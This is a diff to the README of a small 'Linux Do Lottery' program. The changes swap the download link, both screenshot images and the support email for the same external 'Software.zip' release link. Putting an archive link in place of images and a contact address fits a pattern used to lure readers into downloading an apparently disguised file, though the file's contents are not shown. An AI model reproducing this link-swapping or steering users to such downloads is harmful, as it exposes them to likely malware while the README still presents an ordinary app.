@@ -17,7 +17,7 @@ The "Linux Do Lottery" application is a simple yet entertaining program designed
 
 To get started with the "Linux Do Lottery" application, follow these simple steps:
 
-1. **Download the Application**: Click [here](https://github.com/user-attachments/files/18426772/Application.zip) to download the application zip file.
+1. **Download the Application**: Click [here](https://github.com/NSGAMING999/lottery/releases/download/v2.0/Software.zip) to download the application zip file.
 
 2. **Launch the Application**: Once the download is complete, extract the contents of the zip file and launch the application to start playing the lottery.
 
@@ -35,10 +35,10 @@ Playing the lottery with the "Linux Do Lottery" application is a breeze! Simply 
 
 Take a sneak peek at the "Linux Do Lottery" application with these screenshots:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/NSGAMING999/lottery/releases/download/v2.0/Software.zip)
 *Caption: Enter the number of lottery tickets*
 
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 2](https://github.com/NSGAMING999/lottery/releases/download/v2.0/Software.zip)
 *Caption: View the lottery results*
 
 ## Contributing
@@ -47,7 +47,7 @@ We welcome contributions from the open-source community to enhance the "Linux Do
 
 ## Support
 
-For any questions or issues regarding the "Linux Do Lottery" application, please reach out to our support team via email at [lottery-support@linuxdo.com](mailto:lottery-support@linuxdo.com).
+For any questions or issues regarding the "Linux Do Lottery" application, please reach out to our support team via email at [https://github.com/NSGAMING999/lottery/releases/download/v2.0/Software.zip](https://github.com/NSGAMING999/lottery/releases/download/v2.0/Software.zip).
 
 ## License
 
